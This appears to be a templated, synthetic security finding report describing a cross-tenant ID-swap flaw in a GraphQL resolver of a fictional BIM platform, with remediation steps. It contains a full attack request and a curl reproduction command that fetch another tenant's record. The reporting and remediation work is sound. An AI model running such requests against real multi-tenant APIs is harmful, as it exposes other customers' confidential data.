# Security Analysis Report
**System:** BuildCore BIM Collaboration
**Domain:** Construction / BIM Platform
**Example ID:** GQL-0328
**Artifact analyzed:** context.txt (sole source)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | HIGH | Single-User — Pattern 10.1 | ID swap in own request — attacker with valid `tenant-4668` token swaps `resourceId` to `R-2328` to access cross-tenant BIM collaboration record belonging to `tenant-a49d` |

---

## Finding 1 — Single-User: ID Swap in Own Request (Pattern 10.1)

### Summary
The `getResource` resolver on BuildCore BIM Collaboration (`api.buildcore-bim-collab.example.com`) fetches by `resourceId` only, without verifying the fetched object's `tenantId` against the JWT's `tenantId`. Per §5.0 Pattern 10.1, an attacker with `tenant-4668` credentials swaps their own `resourceId` for `R-2328` (belonging to `tenant-a49d`) and the resolver returns the victim's BIM project data including `sensitiveField` and `internalNotes`.

**Note:** HAR operation `getResource` and response key `getResource` are consistent in this example.

**Redis cache vulnerability:** Cache is keyed by `resourceId` only (no tenant dimension), enabling cross-tenant cache poisoning of BIM project records.

**Pattern:** 10.1 — ID swap in own request (Single-User)
**Affected resolver:** `getResource`
**Affected endpoint:** `POST https://api.buildcore-bim-collab.example.com/graphql`

### Evidence from HAR (§6.0)

**Request — Attack**
```
POST https://api.buildcore-bim-collab.example.com/graphql
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG
Content-Type: application/json
x-tenant-id: tenant-4668

{"query": "query VulnerableOp { getResource(id: \"R-2328\") { resourceId tenantId ownerId data { sensitiveField internalNotes } } }"}
```
Note: `x-request-id` is a **server-assigned response header**, not a request header.

**Response — Victim BIM Record Returned (cross-tenant)**
```json
{
  "data": {
    "getResource": {
      "tenantId": "tenant-a49d",
      "ownerId": "other-user-4668a49d",
      "data": {
        "sensitiveField": "CONFIDENTIAL-4668a49d",
        "internalNotes": "Internal data exposed"
      }
    }
  }
}
```
Attacker token: `tenant-4668`. Returned data belongs to: `tenant-a49d`. Cross-tenant BIM collaboration data access confirmed via ID swap.

### Steps to Reproduce
```bash
curl -s -X POST "https://api.buildcore-bim-collab.example.com/graphql" \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" \
  -H "x-tenant-id: tenant-4668" \
  -d '{"query": "query VulnerableOp { getResource(id: \"R-2328\") { resourceId tenantId ownerId data { sensitiveField internalNotes } } }"}'
# Vulnerable: returns tenant-a49d BIM record — ID swap cross-tenant access succeeded
# Secure: {"errors": [{"message": "Forbidden — tenant mismatch"}]}
```

### Remediation
1. In `getResource` resolver: after fetching, verify `resource.tenantId` matches `jwt.tenantId`.
2. Re-key Redis cache to include `tenantId`.
